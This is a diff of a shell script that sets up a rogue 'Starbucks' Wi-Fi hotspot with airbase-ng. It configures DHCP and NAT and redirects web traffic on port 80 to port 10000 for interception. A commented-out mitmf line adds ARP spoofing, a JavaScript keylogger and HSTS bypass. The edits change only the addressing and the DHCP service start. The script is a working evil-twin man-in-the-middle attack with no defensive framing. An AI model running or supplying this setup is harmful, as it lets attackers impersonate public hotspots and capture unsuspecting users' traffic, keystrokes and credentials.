@@ -10,10 +10,11 @@ mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd-backup.conf
 cp dhcpd.conf /etc/dhcp/dhcpd.conf
 
 airbase-ng -e Starbucks -c 11 wlan1mon
+ifconfig at0 up
 
-ifconfig at0 192.168.2.1 netmask 255.255.255.0
+ifconfig at0 10.128.2.1 netmask 255.255.255.0
 ifconfig at0 mtu 1400
-route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
+route add -net 10.128.2.0 netmask 255.255.255.0 gw 10.128.2.1
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
@@ -26,7 +27,8 @@ iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
 dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
-service isc-dhcp-server start
+/etc/init.d/isc-dhcp-server start
+#service isc-dhcp-server start
 
 #mitmf -i at0 --spoof --arp -gateway 192.168.2.1 --jskeylogger --hsts
 
